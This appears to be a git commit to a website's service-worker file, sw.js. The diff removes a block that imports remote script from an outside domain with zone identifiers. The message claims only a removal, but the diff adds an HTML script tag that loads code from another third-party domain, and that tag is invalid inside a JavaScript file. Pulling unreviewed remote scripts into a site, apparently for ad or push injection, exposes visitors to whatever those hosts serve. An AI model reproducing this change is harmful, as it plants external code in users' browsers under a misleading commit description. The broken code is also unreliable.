6115dba685f5bddd22935b598fd824c90a7579d2
alphanetpool <alphanetpool@gmail.com>
2026-09-08 01:24:44 +0100

    Remove service worker options and import script

--- sw.js
+++ sw.js
@@ -1,6 +1,1 @@
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 11749431
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+<script src="https://quge5.com/88/tag.min.js" data-zone="277589" async data-cfasync="false"></script>
